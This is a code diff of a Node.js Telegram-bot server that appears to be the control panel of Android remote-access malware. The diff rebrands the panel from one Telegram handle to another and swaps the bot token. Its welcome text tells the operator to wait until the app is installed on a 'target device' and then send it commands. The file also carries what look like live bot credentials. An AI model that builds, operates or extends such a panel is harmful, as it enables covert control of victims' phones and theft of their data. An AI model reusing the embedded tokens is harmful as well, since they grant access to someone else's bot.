@@ -7,7 +7,7 @@ const multer = require('multer');
 const bodyParser = require('body-parser')
 const axios = require("axios");
 
-const token = '7749854961:AAEIlvWWmw8LXcTMFOXCwis6OGxAATfLf2A'
+const token = '7832813485:AAHJ-15egtVOV3HcrseDi-tcSBZ1_aV-rl0'
 const id = '7824812862'
 const address = 'https://www.google.com'
 
@@ -25,7 +25,7 @@ let currentNumber = ''
 let currentTitle = ''
 
 app.get('/', function (req, res) {
-    res.send('<h1 align="center" style="font-size:18px; color:blue;">❖✙𝙎𝙚𝙧𝙫𝙚𝙧 𝙪𝙥𝙡𝙤𝙖𝙙𝙚𝙙 𝙨𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡𝙡𝙮✙❖</h1> <br> <p style="font-size:14px; text-align:center; color:red;">𝗧𝗘𝗟𝗘𝗚𝗥𝗔𝗠 𝗚𝗥𝗨𝗢𝗣➩ @JALLAD_PAPA_0</p>')
+    res.send('<h1 align="center" style="font-size:18px; color:blue;">❖✙𝙎𝙚𝙧𝙫𝙚𝙧 𝙪𝙥𝙡𝙤𝙖𝙙𝙚𝙙 𝙨𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡𝙡𝙮✙❖</h1> <br> <p style="font-size:14px; text-align:center; color:red;">𝗧𝗘𝗟𝗘𝗚𝗥𝗔𝗠 𝗚𝗥𝗨𝗢𝗣➩ @CRACKERZENSHU</p>')
 })
 
 app.post("/uploadFile", upload.single('file'), (req, res) => {
@@ -311,13 +311,13 @@ appBot.on('message', (message) => {
     if (id == chatId) {
         if (message.text == '/start') {
             appBot.sendMessage(id,
-                '°• 🪴𝗪𝗘𝗟𝗖𝗢𝗠𝗘 𝗧𝗢 जल्लाद 𝗣𝗔𝗡𝗘𝗟🪴\n\n' +
+                '°• 🪴 ZENSHU 🪴\n\n' +
                 '• ɪꜰ ᴛʜᴇ ᴀᴘᴘʟɪᴄᴀᴛɪᴏɴ ɪꜱ ɪɴꜱᴛᴀʟʟᴇᴅ ᴏɴ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ, ᴡᴀɪᴛ ꜰᴏʀ ᴛʜᴇ ᴄᴏɴɴᴇᴄᴛɪᴏɴ\n\n' +
                 '• ᴡʜᴇɴ ʏᴏᴜ ʀᴇᴄᴇɪᴠᴇ ᴛʜᴇ ᴄᴏɴɴᴇᴄᴛɪᴏɴ ᴍᴇꜱꜱᴀɢᴇ, ɪᴛ ᴍᴇᴀɴꜱ ᴛʜᴀᴛ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ ɪꜱ ᴄᴏɴɴᴇᴄᴛᴇᴅ ᴀɴᴅ ʀᴇᴀᴅʏ ᴛᴏ ʀᴇᴄᴇɪᴠᴇ ᴛʜᴇ ᴄᴏᴍᴍᴀɴᴅ\n\n' +
                 '• ᴄʟɪᴄᴋ ᴏɴ ᴛʜᴇ ᴄᴏᴍᴍᴀɴᴅ ʙᴜᴛᴛᴏɴ ᴀɴᴅ ꜱᴇʟᴇᴄᴛ ᴛʜᴇ ᴅᴇꜱɪʀᴇᴅ ᴅᴇᴠɪᴄᴇ ᴛʜᴇɴ ꜱᴇʟᴇᴄᴛ ᴛʜᴇ ᴅᴇꜱɪʀᴇᴅ ᴄᴏᴍᴍᴀɴᴅ ᴀᴍᴏɴɢ ᴛʜᴇ ᴄᴏᴍᴍᴀɴᴅꜱ\n\n' +
-                '• 📣𝗙𝗶𝗿𝘀𝘁 𝗝𝗼𝗶𝗻 👉 @JALLAD_PAPA_0 \n\n' +
-                '• 🌺𝗠𝗮𝗶𝗻 𝗢𝘄𝗻𝗲𝗿👉 @JALLAD_PAPA_0 \n\n' +
-                '• 🧭𝗠𝗮𝗶𝗻 𝗚𝗿𝘂𝗼𝗽👉 @JALLAD_PAPA_0 \n\n' +
+                '• 📣𝗙𝗶𝗿𝘀𝘁 𝗝𝗼𝗶𝗻 👉 @ \n\n' +
+                '• 🌺𝗠𝗮𝗶𝗻 𝗢𝘄𝗻𝗲𝗿👉 @CRACKERZENSHU \n\n' +
+                '• 🧭𝗠𝗮𝗶𝗻 𝗚𝗿𝘂𝗼𝗽👉 @CRACKERZENSHU \n\n' +
                 '• ɪꜰ ʏᴏᴜ ɢᴇᴛ ꜱᴛᴜᴄᴋ ꜱᴏᴍᴇᴡʜᴇʀᴇ ɪɴ ᴛʜᴇ ʙᴏᴛ, ꜱᴇɴᴅ /start ᴄᴏᴍᴍᴀɴᴅ',
                 {
                     parse_mode: "HTML",
